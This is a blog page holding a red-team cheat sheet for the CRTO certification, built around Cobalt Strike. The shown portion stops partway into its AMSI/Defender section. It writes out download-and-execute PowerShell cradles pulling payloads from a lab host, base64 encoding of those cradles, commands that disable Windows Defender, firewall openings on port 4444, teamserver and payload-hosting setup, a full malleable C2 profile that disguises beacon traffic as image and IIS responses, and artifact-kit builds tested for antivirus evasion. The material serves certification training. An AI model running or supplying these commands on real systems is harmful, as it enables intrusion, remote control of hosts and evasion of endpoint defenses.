<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="Certified Red Team Operator (CRTO) - Cheatsheet Name : CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)
Course Link : https://training.zeropointsecurity.co.uk/courses/red-team-ops
Original Cheatsheet Link : https://github.com/0xn1k5/Red-Teaming/blob/main/Red Team Certifications - Notes %26 Cheat Sheets/CRTO - Notes %26 Cheat Sheet.md
Compiled By : Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )
Modified By : An0nud4y ( Twitter: https://twitter.com/an0nud4y | Blog: https://an0nud4y.com )
 Disclaimer : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/notes/crto-notes/><title>Certified Red Team Operator (CRTO) - Notes :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="Certified Red Team Operator (CRTO) - Notes"><meta itemprop=description content="Certified Red Team Operator (CRTO) - Cheatsheet Name : CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)
Course Link : https://training.zeropointsecurity.co.uk/courses/red-team-ops
Original Cheatsheet Link : https://github.com/0xn1k5/Red-Teaming/blob/main/Red Team Certifications - Notes %26 Cheat Sheets/CRTO - Notes %26 Cheat Sheet.md
Compiled By : Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )
Modified By : An0nud4y ( Twitter: https://twitter.com/an0nud4y | Blog: https://an0nud4y.com )
 Disclaimer : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning."><meta itemprop=datePublished content="2023-10-22T00:00:00+00:00"><meta itemprop=dateModified content="2023-10-22T00:00:00+00:00"><meta itemprop=wordCount content="15808"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Certified Red Team Operator (CRTO) - Notes"><meta name=twitter:description content="Certified Red Team Operator (CRTO) - Cheatsheet Name : CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)
Course Link : https://training.zeropointsecurity.co.uk/courses/red-team-ops
Original Cheatsheet Link : https://github.com/0xn1k5/Red-Teaming/blob/main/Red Team Certifications - Notes %26 Cheat Sheets/CRTO - Notes %26 Cheat Sheet.md
Compiled By : Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )
Modified By : An0nud4y ( Twitter: https://twitter.com/an0nud4y | Blog: https://an0nud4y.com )
 Disclaimer : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning."><meta property="og:title" content="Certified Red Team Operator (CRTO) - Notes"><meta property="og:description" content="Certified Red Team Operator (CRTO) - Cheatsheet Name : CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)
Course Link : https://training.zeropointsecurity.co.uk/courses/red-team-ops
Original Cheatsheet Link : https://github.com/0xn1k5/Red-Teaming/blob/main/Red Team Certifications - Notes %26 Cheat Sheets/CRTO - Notes %26 Cheat Sheet.md
Compiled By : Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )
Modified By : An0nud4y ( Twitter: https://twitter.com/an0nud4y | Blog: https://an0nud4y.com )
 Disclaimer : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/notes/crto-notes/"><meta property="article:published_time" content="2023-10-22T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-22T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2023-10-22 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>S3cur!ty_Bl0g</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/notes/crto-notes/>Certified Red Team Operator (CRTO) - Notes</a></h2><div class=post-content><h1 id=certified-red-team-operator-crto---cheatsheet>Certified Red Team Operator (CRTO) - Cheatsheet</h1><p><strong>Name</strong> : <strong>CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)</strong></p><p>Course Link : <a href=https://training.zeropointsecurity.co.uk/courses/red-team-ops>https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></p><p>Original Cheatsheet Link : <a href=https://github.com/0xn1k5/Red-Teaming/blob/main/Red%20Team%20Certifications%20-%20Notes%20%26%20Cheat%20Sheets/CRTO%20-%20Notes%20%26%20Cheat%20Sheet.md>https://github.com/0xn1k5/Red-Teaming/blob/main/Red Team Certifications - Notes %26 Cheat Sheets/CRTO - Notes %26 Cheat Sheet.md</a></p><p>Compiled By : Nikhil Raj ( Twitter: <a href=https://twitter.com/0xn1k5>https://twitter.com/0xn1k5</a> | Blog: <a href=https://organicsecurity.in/>https://organicsecurity.in</a> )</p><p>Modified By : An0nud4y ( Twitter: <a href=https://twitter.com/an0nud4y>https://twitter.com/an0nud4y</a> | Blog: <a href=https://an0nud4y.com>https://an0nud4y.com</a> )</p><blockquote><p><strong>Disclaimer</strong> : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.</p></blockquote><blockquote><p>These Notes/Cheatsheet are also available on Github - <a href=https://github.com/An0nUD4Y/CRTO-Notes>https://github.com/An0nUD4Y/CRTO-Notes</a></p></blockquote><blockquote><p>Red Teaming Notes Notion : <a href="https://an0nud4y.notion.site/CRTO-Notes-a2a6242a4c4b4506b31f46db20155608?pvs=4">https://an0nud4y.notion.site/CRTO-Notes-a2a6242a4c4b4506b31f46db20155608?pvs=4</a></p></blockquote><blockquote><p>Access to my <strong>CRTO</strong> Notes is restricted due to Policy. If you are enrolled in CRTO ping me on discord (an0nud4y) or <a href=https://an0nud4y.com>https://an0nud4y.com</a> to get my CRTO notes access.</p></blockquote><hr><h1 id=table-of-contents>Table of Contents</h1><ul><li><a href=#misc>MISC</a></li><li><a href=#command--control>Command & Control</a></li><li><a href=#setup-cs-listeners>Setup CS Listeners</a></li><li><a href=#defender-antivirus--amsi>Defender Antivirus / AMSI</a></li><li><a href=#initial-compromise>Initial Compromise</a></li><li><a href=#host-reconnaissance>Host Reconnaissance</a></li><li><a href=#host-persistence-normal--privileged>Host Persistence</a></li><li><a href=#host-privilege-escalation>Host Privilege Escalation</a></li><li><a href=#credential-theft>Credential Theft</a></li><li><a href=#domain-recon>Domain Recon</a></li><li><a href=#user-impersonation>User Impersonation</a></li><li><a href=#lateral-movement>Lateral Movement</a></li><li><a href=#session-passing>Session Passing</a></li><li><a href=#pivoting>Pivoting</a></li><li><a href=#data-protection-api-dpapi>Data Protection API (DPAPI)</a></li><li><a href=#kerberos>Kerberos</a></li><li><a href=#active-directory-certificate-services>Active Directory Certificate Services</a></li><li><a href=#group-policy>Group Policy</a></li><li><a href=#mssql-servers>MSSQL Servers</a></li><li><a href=#domain-dominance>Domain Dominance</a></li><li><a href=#forest--domain-trusts>Forest & Domain Trusts</a></li><li><a href=#laps>LAPS</a></li><li><a href=#applocker>AppLocker</a></li><li><a href=#data-exfiltration>Data Exfiltration</a></li><li><a href=#reference>Reference</a></li></ul><hr><h3 id=misc>MISC</h3><p></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Run a python3 webserver</span>
$ python3 -m http.server

<span style=color:#75715e># Check outbound access to TeamServer</span>
$ iwr -Uri http<span style=color:#960050;background-color:#1e0010>:</span>//nickelviper.com/a
$ iwr -Uri http<span style=color:#960050;background-color:#1e0010>:</span>//nickelviper.com/a -OutFile beacon.ps1
<span style=color:#75715e># Change incoming firewall rules</span>
beacon&gt; powerpick Get-NetFirewallRule
<span style=color:#75715e># Enable http inbound and outbound connection</span>
beacon&gt; powerpick New-NetFirewallRule -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HTTP-Inbound</span><span style=color:#e6db74>&#34;</span> -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HTTP (TCP-In)</span><span style=color:#e6db74>&#34;</span> -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 80
beacon&gt; powerpick New-NetFirewallRule -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HTTP-Outbound</span><span style=color:#e6db74>&#34;</span> -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HTTP (TCP-Out)</span><span style=color:#e6db74>&#34;</span> -Enabled True -Direction Outbound -Protocol TCP -Action Allow -LocalPort 80
<span style=color:#75715e># Enable Specific port inbound and outbound connection</span>
<span style=color:#75715e># Inbound Rule</span>
beacon&gt; powerpick New-NetFirewallRule -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Allow-Port-Inbound</span><span style=color:#e6db74>&#34;</span> -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Allow Inbound Connections to Port 12345</span><span style=color:#e6db74>&#34;</span> -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 4444
<span style=color:#75715e># Outbound Rule</span>
beacon&gt; powerpick New-NetFirewallRule -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Allow-Port-Outbound</span><span style=color:#e6db74>&#34;</span> -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Allow Outbound Connections to Port 12345</span><span style=color:#e6db74>&#34;</span> -Enabled True -Direction Outbound -Protocol TCP -Action Allow -RemotePort 4444
<span style=color:#75715e># Removing a firewall rule by its name</span>
beacon&gt; powerpick Remove-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Test Rule</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e># Disabled Real Time Protection / Windows Defender</span>
beacon&gt; powerpick Set-MPPreference -DisableRealTimeMonitoring $true -Verbose
beacon&gt; powerpick Set-MPPreference -DisableIOAVProtection $true -Verbose
beacon&gt; powerpick Set-MPPreference -DisableIntrusionPreventionSystem $true -Verbose

<span style=color:#75715e>## Encode the powershell payload to base64 for handling extra quotes </span>
<span style=color:#75715e># From Powershell </span>
PS C:\&gt; $str = <span style=color:#e6db74>&#39;IEX ((new-object net.webclient).downloadstring(&#34;http://nickelviper.com/a&#34;))&#39;</span>
PS C:\&gt; <span style=color:#66d9ef>[System.Convert]</span>::ToBase64String(<span style=color:#66d9ef>[System.Text.Encoding]</span>::Unicode.GetBytes($str))
<span style=color:#75715e>#From Linux </span>
$ echo -n <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.31/shell.ps1&#39;)</span><span style=color:#e6db74>&#34;</span> | iconv -t UTF-16LE | base64 -w 0

<span style=color:#75715e># Final Command to execute encoded payload</span>
powershell -nop -enc &lt;BASE64_ENCODED_PAYLOAD&gt;

<span style=color:#75715e># CobaltStrike AggressorScripts for Persistence</span>
https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/Peco602/cobaltstrike-aggressor-scripts/tree/main/persistence-sharpersist
</code></pre></div><h3 id=command--control>Command & Control</h3><ul><li>Setting up DNS records for DNS based beacon payloads</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Set below DNS Type A &amp; NS records, where IP points to TeamServer</span>

@    | A  | 10.10.5.50
ns1  | A  | 10.10.5.50
pics | NS | ns1.nickelviper.com

<span style=color:#75715e># Verify the DNS configuration from TeamServer, it should return 0.0.0.0</span>
$ dig @ns1.nickelviper.com test.pics.nickelviper.com +short

<span style=color:#75715e># Use pics.nickelviper.com as DNS Host and Stager in Listener Configuration</span>
</code></pre></div><ul><li>Start the teamserver and run as service</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>&gt; sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$ ip a
$ sudo nano /etc/systemd/system/teamserver.service

<span style=color:#66d9ef>[Unit]</span>
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

<span style=color:#66d9ef>[Service]</span>
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

<span style=color:#66d9ef>[Install]</span>
WantedBy=multi-user.target

$ sudo systemctl daemon-reload
$ sudo systemctl status teamserver.service
$ sudo systemctl start teamserver.service
$ sudo systemctl enable teamserver.service
</code></pre></div><ul><li>Enable Hosting of Web Delivery Payloads via agscript client in headless mode</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$ cat host_payloads.cna

<span style=color:#75715e># Connected and ready</span>
on ready {

    <span style=color:#75715e># Generate payload</span>
    $payload = artifact_payload(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>http</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>powershell</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>x64</span><span style=color:#e6db74>&#34;</span>);

    <span style=color:#75715e># Host payload</span>
    site_host(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>10.10.5.50</span><span style=color:#e6db74>&#34;</span>, 80, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>/a</span><span style=color:#e6db74>&#34;</span>, $payload, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>text/plain</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Auto Web Delivery (PowerShell)</span><span style=color:#e6db74>&#34;</span>, false);
}

<span style=color:#75715e># Add below command in &#34;/etc/systemd/system/teamserver.service&#34; file</span>

ExecStartPost=/bin/sh -c <span style=color:#e6db74>&#39;/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &amp;&#39;</span>
</code></pre></div><ul><li>Custom Malleable C2 Profile for CRTO</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Custom C2 Profile for CRTO (Modified by an0nud4y)</span>
set sample_name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Dumbledore</span><span style=color:#e6db74>&#34;</span>;
set sleeptime <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>2000</span><span style=color:#e6db74>&#34;</span>;
set jitter    <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>20</span><span style=color:#e6db74>&#34;</span>;
set useragent <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36</span><span style=color:#e6db74>&#34;</span>;
set host_stage <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>true</span><span style=color:#e6db74>&#34;</span>;

stage {
        set userwx <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>false</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>#Allocate Beacon DLL as RW/RX rather than RWX.</span>
        set cleanup <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>true</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>#Free memory associated with reflective loader after it has been loaded</span>
        set obfuscate <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>true</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e># Load Beacon into memory without its DLL headers</span>
        set module_x64 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>xpsservices.dll</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>#Load DLL from disk, then replace its memory with Beacon.</span>
}

post-ex {
        set amsi_disable <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>true</span><span style=color:#e6db74>&#34;</span>;
        <span style=color:#75715e># Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command (psexec_psh , winrm and winrm64).</span>
				<span style=color:#75715e># Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/</span>
				
				set spawnto_x64 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%windir%\\sysnative\\dllhost.exe</span><span style=color:#e6db74>&#34;</span>;
				<span style=color:#75715e>#set spawnto_x64 &#34;%windir%\\System32\\dllhost.exe&#34;;</span>
        set spawnto_x86 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%windir%\\syswow64\\dllhost.exe</span><span style=color:#e6db74>&#34;</span>;
				
}

http-get {
	set uri <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>/cat.gif /image /pixel.gif /logo.gif</span><span style=color:#e6db74>&#34;</span>;

	client {
        	<span style=color:#75715e># customize client indicators</span>
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accept</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>text/html,image/avif,image/webp,*/*</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accept-Language</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>en-US,en;q=0.5</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accept-Encoding</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>gzip, deflate</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Referer</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>https://www.google.com</span><span style=color:#e6db74>&#34;</span>;

		<span style=color:#66d9ef>parameter</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>utm</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ISO-8898-1</span><span style=color:#e6db74>&#34;</span>;
		<span style=color:#66d9ef>parameter</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>utc</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>en-US</span><span style=color:#e6db74>&#34;</span>;

		metadata{
			base64;
			header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Cookie</span><span style=color:#e6db74>&#34;</span>;
		}
	}

	server {
		<span style=color:#75715e># customize server indicators</span>
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Content-Type</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>image/gif</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Server</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Microsoft IIS/10.0</span><span style=color:#e6db74>&#34;</span>;	
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>X-Powered-By</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ASP.NET</span><span style=color:#e6db74>&#34;</span>;	

		output{
			prepend <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b</span><span style=color:#e6db74>&#34;</span>;
      prepend <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>;
      prepend <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>;
			print;
		}
	}
}

http-post {
	set uri <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>/submit.aspx /finish.aspx</span><span style=color:#e6db74>&#34;</span>;

	client {

		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Content-Type</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>application/octet-stream</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accept</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>text/html,image/avif,image/webp,*/*</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accept-Language</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>en-US,en;q=0.5</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accept-Encoding</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>gzip, deflate</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Referer</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>https://www.google.com</span><span style=color:#e6db74>&#34;</span>;
		
		id{
			<span style=color:#66d9ef>parameter</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>id</span><span style=color:#e6db74>&#34;</span>;
		}

		output{
			print;
		}

	}

	server {
		<span style=color:#75715e># customize server indicators</span>
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Content-Type</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>text/plain</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Server</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Microsoft IIS/10.0</span><span style=color:#e6db74>&#34;</span>;	
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>X-Powered-By</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ASP.NET</span><span style=color:#e6db74>&#34;</span>;	

		output{
			netbios;
			prepend <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;</span><span style=color:#e6db74>&#34;</span>;
			append <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span><span style=color:#e6db74>&#34;</span>;
			print;
		}
	}
}

http-stager {

	server {
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Content-Type</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>application/octet-stream</span><span style=color:#e6db74>&#34;</span>;
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Server</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Microsoft IIS/10.0</span><span style=color:#e6db74>&#34;</span>;	
		header <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>X-Powered-By</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ASP.NET</span><span style=color:#e6db74>&#34;</span>;
	}
}
</code></pre></div><h3 id=setup-cs-listeners>Setup CS Listeners</h3><ul><li><p>Setting up the SMB Listener</p><ul><li>Default pipe name is quite well signatured.  A good strategy is to emulate names known to be used by common applications or Windows itself.</li><li>Use <code>PS C:\> ls \\.\pipe\</code> to list all currently listening pipes for inspiration.<ul><li><code>TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57</code></li></ul></li></ul></li><li><p>Setting up Pivot Listener</p><ul><li>Beacon_reverse_tcp and Beacon_Bind_Tcp both are different type of Listeners.</li><li>Pivot Listeners can only be created from a beacon.</li><li>Steps to create a Pivot Listener<ul><li>Click on the Beacon Host</li><li>Select Pivoting > Listener and Give it a Name and leave other options untouched (Modify if required)</li><li>Now in the Beacon Host machine you can check that is Beacon Process has a opened Port<ul><li><code>netstat -anop tcp | findstr &lt;PORT></code> where port is the pivot listener port</li></ul></li><li>Now go to the payloads and generate any payload and select the beacon_reverse_tcp as payload listener.</li></ul></li></ul></li></ul><h3 id=defender-antivirus--amsi>Defender Antivirus / AMSI</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Modifying Artifact Kit</span>
<span style=color:#75715e># Modify script_template.cna and replace all instances of rundll32.exe with dllhost.exe</span>
PS &gt; $template_path=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna</span><span style=color:#e6db74>&#34;</span> ; (Get-Content -Path $template_path)  <span style=color:#f92672>-replace</span> <span style=color:#e6db74>&#39;rundll32.exe&#39;</span> ,  <span style=color:#e6db74>&#39;dllhost.exe&#39;</span> | Set-Content -Path $template_path
<span style=color:#75715e># Compile the Artifact kit (From WSL in Attacker windows Machine)</span>
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh pipe VirtualAlloc 296948 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
<span style=color:#75715e># Other Techniques are : mailslot, peek , pipe, readfile, readfile-v2</span>
<span style=color:#75715e># Now load the artifact kit in cobalt strike (Cobalt Strike &gt; Script Manager &gt; Load)</span>
<span style=color:#75715e># Now generate the payloads and test if these are getting detected, if they are detected by ThreatCheck , Follow the notes to modify the artifact kit code.</span>

<span style=color:#75715e># Resource kit</span>
<span style=color:#75715e># Compile the resource kit</span>
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource &amp;&amp; ./build.sh /mnt/c/Tools/cobaltstrike/resources

<span style=color:#75715e># Elevate kit</span>
<span style=color:#75715e># Load Elevate kit in cobalt strike (manually or from script console)</span>
aggressor&gt; load C:\Tools\cobaltstrike\elevate-kit\elevate.cna

<span style=color:#75715e>#-----------------------------------------------------------------------------------</span>
<span style=color:#75715e># To test AMSI, use the AMSI Test Sample PowerShell cmdlet.</span>
<span style=color:#75715e># &#34;The term &#39;AMSI&#39; is not recognised&#34; refers that AMSI is not enabled, So either AMSI Bypass is working or Defender is not enabled.</span>
Invoke-Expression <span style=color:#e6db74>&#39;AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386&#39;</span>

<span style=color:#75715e># To test on-disk detections, drop the EICAR test file somewhere such as the desktop.</span>
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST<span style=color:#f92672>-FILE</span>!$H+H*

<span style=color:#75715e># Verify if the payload is AV Safe</span>
PS&gt; C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Release\ThreatCheck.exe <span style=color:#f92672>-f</span> C:\Payloads\smb_x64.svc.exe -e AMSI
PS&gt; C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe <span style=color:#f92672>-f</span> C:\Payloads\http_x64.exe -e AMSI
<span style=color:#75715e># One Liner to test all payloads for AV safe</span>
